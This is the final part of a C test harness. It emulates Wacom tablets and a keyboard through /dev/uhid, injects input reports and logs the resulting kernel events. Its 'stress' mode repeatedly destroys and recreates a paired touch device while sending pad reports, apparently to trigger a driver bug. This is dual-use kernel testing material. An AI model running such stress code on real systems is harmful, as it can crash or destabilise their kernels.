        int bfin = open_event_by_name("Wacom Cintiq 27QHD touch Finger", bpath, sizeof(bpath));
        logmsg("qhd2 apad=%s fd=%d bfin=%s fd=%d\n", apath, apad, bpath, bfin);
        if (bfin >= 0) show_sw_caps("qhd2-bfin", bfin);
        struct uhid_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.type = UHID_INPUT2;
        ev.u.input2.size = 10;
        ev.u.input2.data[0] = 0x03;
        ev.u.input2.data[2] = 0x04; /* features->oPid path: touch mute toggle */
        ev.u.input2.data[3] = 0x01;
        ssize_t w = write(fa, &ev, sizeof(ev));
        logmsg("qhd2 pad write=%zd errno=%d\n", w, errno);
        usleep(100000);
        if (apad >= 0) show_events("qhd2-apad", apad);
        if (bfin >= 0) show_events("qhd2-bfin", bfin);
        uhid_destroy_fd(fa);
        uhid_destroy_fd(fb);
        return 0;
    }

    if (!strcmp(mode, "i5")) {
        int fa = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        int fb = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fa < 0 || fb < 0) return 2;
        struct udev *a = udev_new(fa), *b = udev_new(fb);
        uhid_create(fa, "Wacom Intuos5 touch M Pen", "uhid/wacom",
                    rdesc_i5pen, rdesc_i5pen_len, 0x0027);
        uhid_create(fb, "Wacom Intuos5 touch M Touch", "uhid/wacom",
                    rdesc_i5touch, rdesc_i5touch_len, 0x0027);
        wait_started(a, b, 4000);
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        char path[64] = {0};
        int pad = open_event_by_name("Wacom Intuos5 touch M Pad", path, sizeof(path));
        logmsg("i5 pad evdev=%s fd=%d errno=%d\n", path, pad, errno);
        if (pad >= 0) {
            struct uhid_event ev;
            memset(&ev, 0, sizeof(ev));
            ev.type = UHID_INPUT2;
            ev.u.input2.size = 10;
            ev.u.input2.data[0] = 0x03;
            ev.u.input2.data[2] = 0x01;
            ev.u.input2.data[3] = 0x01;
            ssize_t w = write(fa, &ev, sizeof(ev));
            logmsg("i5 pad write=%zd errno=%d\n", w, errno);
            usleep(80000);
            show_events("i5pad", pad);
        }
        uhid_destroy_fd(fa);
        uhid_destroy_fd(fb);
        return 0;
    }

    if (!strcmp(mode, "kb")) {
        int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fd < 0) { logmsg("uhid open %d\n", errno); return 2; }
        struct uhid_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.type = UHID_CREATE2;
        strcpy((char *)ev.u.create2.name, "uhid-kb-test");
        strcpy((char *)ev.u.create2.phys, "uhid.kb");
        ev.u.create2.rd_size = sizeof(rdesc_kb);
        memcpy(ev.u.create2.rd_data, rdesc_kb, sizeof(rdesc_kb));
        ev.u.create2.bus = BUS_USB;
        ev.u.create2.vendor = 0x1234;
        ev.u.create2.product = 0x5678;
        ssize_t w = write(fd, &ev, sizeof(ev));
        logmsg("kb create write=%zd errno=%d\n", w, errno);
        struct udev *u = udev_new(fd);
        wait_started(u, NULL, 3000);
        sleep(1);
        for (int i = 0; i < 10; i++) pump(u, NULL, 100);
        char path[64] = {0};
        int efd = open_event_by_name("uhid-kb-test", path, sizeof(path));
        logmsg("kb evdev=%s fd=%d errno=%d\n", path, efd, errno);
        if (efd >= 0) {
            memset(&ev, 0, sizeof(ev));
            ev.type = UHID_INPUT2;
            ev.u.input2.size = 9;
            ev.u.input2.data[0] = 0x01;
            ev.u.input2.data[1] = 0x00;
            ev.u.input2.data[2] = 0x04; /* key a */
            unsigned char *b = (unsigned char *)&ev;
            logmsg("kb bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
                   b[0],b[1],b[2],b[3],b[4],b[5],b[6],b[7],b[8]);
            w = write(fd, &ev, sizeof(ev));
            logmsg("kb input write=%zd errno=%d\n", w, errno);
            usleep(80000);
            show_events("kb", efd);
        }
        return 0;
    }

    if (!strcmp(mode, "selftest")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "uhid/wacom", &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        char apath[64] = {0}, bpath[64] = {0};
        int apad = open_event_by_name("Wacom Cintiq 27QHD touch Pad", apath, sizeof(apath));
        int bfin = open_event_by_name("Wacom Cintiq 27QHD touch Finger", bpath, sizeof(bpath));
        logmsg("selftest apad=%s fd=%d bfin=%s fd=%d\n", apath, apad, bpath, bfin);
        if (apad >= 0) show_sw_caps("apad", apad);
        if (bfin >= 0) show_sw_caps("bfin", bfin);

        if (apad >= 0) { send_pad(a->fd, 1); usleep(80000); show_events("apad-after-pad", apad); }
        if (bfin >= 0) show_events("bfin-after-pad", bfin);

        /* uinput self-injection sanity check */
        char upath[64] = {0};
        int ufd = create_uinput(90, upath, sizeof(upath));
        if (ufd >= 0) {
            int uev = open(upath, O_RDONLY | O_NONBLOCK);
            show_sw_caps("uinput90", uev);
            struct input_event ie = {.type = EV_SW, .code = SW_MUTE_DEVICE, .value = 1};
            write(ufd, &ie, sizeof(ie));
            struct input_event se = {.type = EV_SYN, .code = SYN_REPORT, .value = 0};
            write(ufd, &se, sizeof(se));
            usleep(30000);
            show_events("uinput90-self", uev);
        }

        uhid_destroy_fd(a->fd);
        uhid_destroy_fd(b->fd);
        return 0;
    }

    if (!strcmp(mode, "stress")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "uhid/wacom", &a, &b)) return 2;
        sleep(1);
        for (int round = 0; round < 200; round++) {
            /* send a few pad reports, then destroy/recreate touch */
            send_pad(a->fd, 4);
            uhid_destroy_fd(b->fd);
            close(b->fd);
            int fb = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
            if (fb < 0) break;
            struct udev *b2 = udev_new(fb);
            uhid_create(fb, "Wacom Intuos5 touch M Touch", "uhid/wacom",
                        rdesc_touch, rdesc_touch_len, WACOM_PID_TOUCH);
            wait_started(NULL, b2, 1000);
            pump(a, b2, 10);
            b = b2;
            if ((round & 15) == 0) logmsg("stress round %d\n", round);
        }
        logmsg("stress done\n");
        return 0;
    }

    fprintf(stderr, "unknown mode\n");
    return 2;
}
